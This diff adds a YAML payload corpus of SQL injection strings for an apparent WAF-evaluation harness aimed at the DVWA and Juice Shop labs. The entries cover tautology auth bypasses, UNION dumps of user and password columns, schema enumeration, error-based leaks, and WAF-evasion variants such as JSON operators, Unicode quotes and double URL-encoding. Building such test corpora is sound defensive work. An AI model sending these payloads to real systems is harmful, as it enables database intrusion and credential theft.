@@ -1,0 +1,361 @@
+# SQL injection payloads — expanded for Phase-7 research rerun.
+# Sources:
+#   - PayloadsAllTheThings / SQL Injection
+#   - OWASP WSTG v4.2
+#   - SecLists / Fuzzing / SQLi
+#   - Claroty Team82 "JS-ON: Security-OFF" (JSON-SQL)
+#   - Imperva / Contrast Security JSON-based WAF bypass research
+#   - OWASP CRS v4 rules file REQUEST-942-APPLICATION-ATTACK-SQLI.conf
+# Destructive payloads (DROP/TRUNCATE/etc) are rejected at load time.
+#
+# Trigger semantics (see wafeval.models.Trigger):
+#   - contains:  baseline body must contain this substring
+#   - regex:     baseline body matches this pattern
+#   - reflected: baseline reflects the payload string
+#   - status:    baseline returns this exact HTTP status
+#   - any_of:    fire if *any* child trigger fires — DVWA MySQL anchor +
+#                Juice Shop SQLite anchor share one entry.
+#
+# Target sinks:
+#   DVWA       /vulnerabilities/sqli/       → emits "First name: <value>"
+#   Juice Shop /rest/products/search        → SQLITE_ERROR page on ill-formed
+#                                              queries; returns JSON on OK
+
+# ==== classical boolean / tautology (5) ====
+- id: sqli-bool-001
+  class: sqli
+  payload: "1' OR '1'='1"
+  trigger: &T
+    kind: any_of
+    any_of:
+      - { kind: contains, needle: "First name" }
+      - { kind: regex, pattern: "SQLITE_ERROR|syntax error|no such column" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/Intruder/exploit.txt"
+
+- id: sqli-bool-002
+  class: sqli
+  payload: "1' OR 1=1 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "OWASP WSTG v4.2 §4.9.4"
+
+- id: sqli-bool-003
+  class: sqli
+  payload: "' OR 'a'='a"
+  trigger: *T
+  cwe: CWE-89
+  source: "SecLists/Fuzzing/SQLi/Generic-SQLi.txt"
+
+- id: sqli-bool-004
+  class: sqli
+  payload: "1' OR 1=1#"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL comments"
+
+- id: sqli-bool-005
+  class: sqli
+  payload: "admin' OR 1=1 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "OWASP cheat-sheet: auth bypass"
+
+# ==== UNION-based (6) ====
+- id: sqli-union-001
+  class: sqli
+  payload: "1' UNION SELECT null, version() -- -"
+  trigger: &TU
+    kind: any_of
+    any_of:
+      - { kind: regex, pattern: "First name|MariaDB|MySQL|[0-9]+\\.[0-9]+\\.[0-9]+" }
+      - { kind: regex, pattern: "SQLITE_ERROR|syntax error" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/MySQL Injection.md"
+
+- id: sqli-union-002
+  class: sqli
+  payload: "' UNION SELECT user(), database() -- -"
+  trigger: *TU
+  cwe: CWE-89
+  source: "OWASP cheat-sheet: MySQL info-gathering"
+
+- id: sqli-union-003
+  class: sqli
+  payload: "1' UNION SELECT user,password FROM users -- -"
+  trigger:
+    kind: any_of
+    any_of:
+      - { kind: regex, pattern: "First name|[a-f0-9]{32}" }
+      - { kind: regex, pattern: "SQLITE_ERROR|syntax error" }
+  cwe: CWE-89
+  source: "DVWA walkthrough — classic UNION creds dump"
+
+- id: sqli-union-004
+  class: sqli
+  payload: "-1' UNION SELECT null,table_name FROM information_schema.tables -- -"
+  trigger: *TU
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL information_schema"
+
+- id: sqli-union-005
+  class: sqli
+  payload: "' UNION ALL SELECT 1,2,3 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "SecLists/Fuzzing/SQLi/Generic-SQLi.txt"
+
+- id: sqli-union-006
+  class: sqli
+  payload: "1' UNION SELECT schema_name,null FROM information_schema.schemata -- -"
+  trigger: *TU
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — schema enumeration"
+
+# ==== stacked (2) ====
+- id: sqli-stacked-001
+  class: sqli
+  payload: "1'; SELECT SLEEP(0) -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/Stacked Queries"
+
+- id: sqli-stacked-002
+  class: sqli
+  payload: "1'; SELECT IF(1=1,1,0) -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — stacked conditional"
+
+# ==== time-based (3) ====
+- id: sqli-time-001
+  class: sqli
+  payload: "1' AND SLEEP(0) -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/Time-based"
+
+- id: sqli-time-002
+  class: sqli
+  payload: "1' AND IF(1=1,SLEEP(0),0) -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "OWASP WSTG v4.2 — conditional timing"
+
+- id: sqli-time-003
+  class: sqli
+  payload: "1' OR SLEEP(0) -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — disjunctive timing"
+
+# ==== error-based (3) ====
+- id: sqli-error-001
+  class: sqli
+  payload: "1' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- -"
+  trigger:
+    kind: any_of
+    any_of:
+      - { kind: regex, pattern: "XPATH|syntax|First name" }
+      - { kind: regex, pattern: "SQLITE_ERROR|no such function" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL error-based"
+
+- id: sqli-error-002
+  class: sqli
+  payload: "1' AND UPDATEXML(1, CONCAT(0x7e, user()), 1) -- -"
+  trigger:
+    kind: any_of
+    any_of:
+      - { kind: regex, pattern: "XPATH|syntax|First name" }
+      - { kind: regex, pattern: "SQLITE_ERROR|no such function" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — UPDATEXML error leak"
+
+- id: sqli-error-003
+  class: sqli
+  payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
+  trigger:
+    kind: any_of
+    any_of:
+      - { kind: regex, pattern: "duplicate|First name|syntax" }
+      - { kind: regex, pattern: "SQLITE_ERROR|no such table" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — double-query error"
+
+# ==== inline-comment obfuscation (3) ====
+- id: sqli-inline-comment-001
+  class: sqli
+  payload: "1'/**/OR/**/'1'='1"
+  trigger: *T
+  cwe: CWE-89
+  source: "OWASP CRS test-suite"
+
+- id: sqli-inline-comment-002
+  class: sqli
+  payload: "1'/*!50000UNION*/SELECT 1,2 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL versioned comment"
+
+- id: sqli-inline-comment-003
+  class: sqli
+  payload: "1'\nOR\n'1'='1"
+  trigger: *T
+  cwe: CWE-89
+  source: "SecLists/Fuzzing/SQLi — newline splitting"
+
+# ==== second-order / auth-bypass (3) ====
+- id: sqli-auth-001
+  class: sqli
+  payload: "admin'-- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — auth-bypass shorthand"
+
+- id: sqli-auth-002
+  class: sqli
+  payload: "' OR '' = '"
+  trigger: *T
+  cwe: CWE-89
+  source: "SecLists/Generic-SQLi"
+
+- id: sqli-auth-003
+  class: sqli
+  payload: "1' OR ASCII(SUBSTRING(user(),1,1))>0 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — blind-ASCII oracle"
+
+# ==== Phase-7 additions: JSON-based SQL injection (Claroty Team82, 2022) ====
+# libinjection was blind to JSON operators until CRS 4 added rule 942550. These
+# entries probe whether an updated rule set blocks JSON-SQL tautologies.
+
+- id: sqli-json-001
+  class: sqli
+  payload: "1 OR JSON_EXTRACT('{\"a\":1}','$.a')=1"
+  trigger: *T
+  cwe: CWE-89
+  source: "Claroty Team82 — JS-ON: Security-OFF (MySQL JSON_EXTRACT)"
+
+- id: sqli-json-002
+  class: sqli
+  payload: "1' OR JSON_VALUE('{\"a\":1}','$.a')=1 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "Imperva blog — JSON_VALUE tautology"
+
+- id: sqli-json-003
+  class: sqli
+  payload: "1'/*!50000OR*/JSON_CONTAINS('{\"a\":1}','1','$.a') -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "Team82 + versioned comment chain"
+
+- id: sqli-json-004
+  class: sqli
+  payload: "1' OR '{\"a\":1}'->>'$.a'='1' -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "MySQL 5.7+ JSON arrow operator"
+
+- id: sqli-json-005
+  class: sqli
+  payload: "1 OR JSON_QUOTE('x') REGEXP 'x'"
+  trigger: *T
+  cwe: CWE-89
+  source: "PortSwigger research — JSON_QUOTE regex chain"
+
+# ==== Phase-7: Unicode / multi-byte encoding (AWS WAF bypass, Sicuranext) ====
+
+- id: sqli-unicode-001
+  class: sqli
+  payload: "1\u2019 OR 1=1 -- -"                     # fancy right single quote
+  trigger: *T
+  cwe: CWE-89
+  source: "Sicuranext — Unicode compatibility chars"
+
+- id: sqli-unicode-002
+  class: sqli
+  payload: "1\uff07 OR 1=1 -- -"                     # fullwidth apostrophe
+  trigger: *T
+  cwe: CWE-89
+  source: "jlajara — Unicode fullwidth SQLi"
+
+- id: sqli-unicode-003
+  class: sqli
+  payload: "1' \u004fr 1=1 -- -"                     # mixed unicode-escaped OR
+  trigger: *T
+  cwe: CWE-89
+  source: "Research: unicode escape in keyword"
+
+# ==== Phase-7: ODBC escape + charset tricks ====
+
+- id: sqli-odbc-001
+  class: sqli
+  payload: "1' {d '2024-01-01'}--"                   # ODBC date-escape shim
+  trigger: *T
+  cwe: CWE-89
+  source: "PortSwigger — ODBC escape parser split"
+
+- id: sqli-scinot-001
+  class: sqli
+  payload: "1.0e0 UNION SELECT null -- -"            # scientific notation prefix
+  trigger: *T
+  cwe: CWE-89
+  source: "MySQL parser — scientific literal escape"
+
+- id: sqli-scinot-002
+  class: sqli
+  payload: "1.e(1)UNION(SELECT(null))--"
+  trigger: *T
+  cwe: CWE-89
+  source: "Gareth Heyes — parenthesised SQLi"
+
+# ==== Phase-7: hex literal + char(n) obfuscation ====
+
+- id: sqli-hex-001
+  class: sqli
+  payload: "1' UNION SELECT 0x61646d696e,0x70617373 -- -"  # hex 'admin','pass'
+  trigger: *T
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL hex literal"
+
+- id: sqli-char-001
+  class: sqli
+  payload: "1' UNION SELECT CHAR(97,100,109,105,110),CHAR(0x70) -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "OWASP WSTG — CHAR() obfuscation"
+
+# ==== Phase-7: HTTP-side encoding (double URL-encode, mixed) ====
+
+- id: sqli-dblenc-001
+  class: sqli
+  payload: "1%2527%2520OR%25201%253D1--"
+  trigger: *T
+  cwe: CWE-89
+  source: "CRS bypass: double URL-encode"
+
+- id: sqli-mixed-case-001
+  class: sqli
+  payload: "1' uNiOn/**/SeLeCt 1,2 -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "Classic case-mix + comment"
+
+# ==== Phase-7: concat / function-name manipulation ====
+
+- id: sqli-concat-001
+  class: sqli
+  payload: "1' UNION SELECT CONCAT('ad','min'),CONCAT(0x70,'ass') -- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "Common WAF evasion via CONCAT"
+
+- id: sqli-backtick-001
+  class: sqli
+  payload: "1' UNION`SELECT`user(),version()`FROM`mysql`.`user`-- -"
+  trigger: *T
+  cwe: CWE-89
+  source: "MySQL backtick-identifier abuse"
